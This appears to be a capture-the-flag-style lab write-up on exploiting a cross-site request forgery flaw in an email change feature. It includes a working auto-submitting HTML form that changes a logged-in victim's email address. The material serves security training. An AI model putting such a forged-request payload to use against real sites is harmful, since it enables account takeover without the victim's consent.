# Lab 1: CSRF Vulnerability with No Defenses

## Objective

The goal of this lab was to exploit a Cross-Site Request Forgery (CSRF) vulnerability in the email change functionality and change the victim's email address without their knowledge.

## Analysis

1. **Inspecting the email change functionality**

   Logged in to my own account using the provided credentials:

   ```text
   Username: wiener
   Password: peter
   ```

   Inspected the email change request and found that the application accepted a simple POST request to:

   ```http
   POST /my-account/change-email
   ```

   The request only required an `email` parameter. There was no CSRF token or other visible protection against cross-site requests.

2. **Creating the CSRF exploit**

   Created an HTML page containing a form that submits a POST request to the email change endpoint.

   The form includes a hidden input containing the new email address. JavaScript automatically submits the form when the page loads.

3. **Delivering the exploit**

   Uploaded the HTML file to the exploit server. When the simulated victim visits the exploit page while authenticated to the target application, their browser submits the email change request using their existing session.

## Exploitation

The exploit uses a hidden form and automatic submission:

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input name="email" type="hidden" value="istoleyour@gmail.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

Because the application does not implement CSRF defenses, it accepts the forged request without verifying whether it originated from the legitimate account page.

## Result

Successfully solved the lab. The victim's browser submitted the forged email change request while authenticated to the application, changing the account's email address without requiring any interaction beyond visiting the exploit page.